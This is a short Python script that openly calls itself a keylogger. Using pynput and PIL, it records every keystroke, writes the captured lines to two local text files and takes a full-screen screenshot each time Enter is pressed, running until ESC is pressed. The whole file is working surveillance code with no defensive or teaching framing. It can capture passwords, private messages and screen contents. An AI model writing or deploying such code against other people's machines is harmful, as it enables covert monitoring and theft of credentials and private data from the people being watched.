from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import datetime
import os

# === CONFIG ===
KEYLOG_FILE = "keylog.txt"
DECRYPTED_FILE = "full_message.txt"
SCREENSHOT_DIR = "screenshots"

# Make screenshot folder if it doesn't exist
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

current_line = ""
full_log = []

# === Save logs ===
def save_logs():
    full_text = '\n'.join(full_log)
    with open(KEYLOG_FILE, 'w', encoding='utf-8') as f1:
        f1.write(full_text)
    with open(DECRYPTED_FILE, 'w', encoding='utf-8') as f2:
        f2.write(full_text)
    print("[+] Log updated.")

# === Take a screenshot ===
def take_screenshot():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
    img = ImageGrab.grab()
    img.save(filename)
    print(f"[📸] Screenshot saved: {filename}")

# === Key press handler ===
def on_press(key):
    global current_line, full_log

    try:
        current_line += key.char
    except AttributeError:
        if key == Key.space:
            current_line += ' '
        elif key == Key.tab:
            current_line += '\t'
        elif key == Key.enter:
            full_log.append(current_line.strip())
            current_line = ""
            save_logs()
            take_screenshot()
        elif key == Key.backspace:
            current_line = current_line[:-1]
        else:
            pass  # Ignore other special keys

# === Key release handler ===
def on_release(key):
    if key == Key.esc:
        return False

# === Start the keylogger ===
print("[*] Keylogger running. Press ESC to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
